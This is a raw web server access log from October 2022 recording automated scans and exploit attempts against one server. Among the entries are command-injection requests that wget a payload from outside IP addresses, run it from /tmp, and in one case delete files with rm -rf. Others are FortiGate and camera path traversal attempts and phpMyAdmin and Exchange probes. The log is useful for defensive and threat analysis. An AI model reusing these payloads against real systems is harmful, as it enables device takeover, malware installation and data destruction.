192.241.213.176 - - [13/Oct/2022:06:55:51 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
152.89.196.23 - - [13/Oct/2022:07:16:44 +0900] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 12967 "-" "Python-urllib/3.8"
92.118.39.30 - - [13/Oct/2022:12:06:47 +0900] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 157 "-" "-"
217.43.221.38 - - [13/Oct/2022:15:18:17 +0900] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.19.141.122/dlink%20-O%20-%3E%20/tmp/dlink;chmod%20777%20/tmp/dlink;sh%20/tmp/dlink%27$ HTTP/1.1" 400 157 "-" "Hakai/2.0"
152.89.196.23 - - [13/Oct/2022:22:51:54 +0900] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 12967 "-" "Python-urllib/3.8"
192.241.216.180 - - [14/Oct/2022:03:36:37 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
41.45.156.160 - - [14/Oct/2022:04:27:50 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws HTTP/1.1" 404 12967 "-" "Hello, world"
192.241.212.226 - - [14/Oct/2022:06:58:36 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
212.64.210.102 - - [14/Oct/2022:08:53:44 +0900] "GET http://121.118.170.159:80/admin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
212.64.210.102 - - [14/Oct/2022:08:53:44 +0900] "GET http://121.118.170.159:80/myadmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
212.64.210.102 - - [14/Oct/2022:08:53:44 +0900] "GET http://121.118.170.159:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
212.64.210.102 - - [14/Oct/2022:08:53:44 +0900] "GET http://121.118.170.159:80/pma/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
212.64.210.102 - - [14/Oct/2022:08:53:44 +0900] "GET http://121.118.170.159:80/dbadmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
212.64.210.102 - - [14/Oct/2022:08:53:44 +0900] "GET http://121.118.170.159:80/phpmyadmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
212.64.210.102 - - [14/Oct/2022:08:53:44 +0900] "GET http://121.118.170.159:80/mysql/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
212.64.210.102 - - [14/Oct/2022:08:53:44 +0900] "GET http://121.118.170.159:80/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
20.219.144.149 - - [14/Oct/2022:08:57:51 +0900] "GET http://121.118.170.159:80/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
20.219.144.149 - - [14/Oct/2022:08:57:51 +0900] "GET http://121.118.170.159:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
20.219.144.149 - - [14/Oct/2022:08:57:51 +0900] "GET http://121.118.170.159:80/phpmyadmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
3.82.244.51 - - [14/Oct/2022:09:18:37 +0900] "GET http://121.118.170.159:80/mysql/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
3.82.244.51 - - [14/Oct/2022:09:18:37 +0900] "GET http://121.118.170.159:80/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
3.82.244.51 - - [14/Oct/2022:09:18:37 +0900] "GET http://121.118.170.159:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
3.82.244.51 - - [14/Oct/2022:09:18:37 +0900] "GET http://121.118.170.159:80/admin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
3.82.244.51 - - [14/Oct/2022:09:18:37 +0900] "GET http://121.118.170.159:80/dbadmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
3.82.244.51 - - [14/Oct/2022:09:18:37 +0900] "GET http://121.118.170.159:80/pma/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
3.82.244.51 - - [14/Oct/2022:09:18:37 +0900] "GET http://121.118.170.159:80/myadmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
3.82.244.51 - - [14/Oct/2022:09:18:37 +0900] "GET http://121.118.170.159:80/phpmyadmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
46.161.27.17 - - [14/Oct/2022:09:42:38 +0900] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 12967 "-" "Python-urllib/3.10"
157.230.244.66 - - [14/Oct/2022:09:59:37 +0900] "GET http://121.118.170.159:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
157.230.244.66 - - [14/Oct/2022:09:59:37 +0900] "GET http://121.118.170.159:80/mysql/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
157.230.244.66 - - [14/Oct/2022:09:59:37 +0900] "GET http://121.118.170.159:80/pma/scripts/setup.php HTTP/1.0" 404 12967 "-" "-"
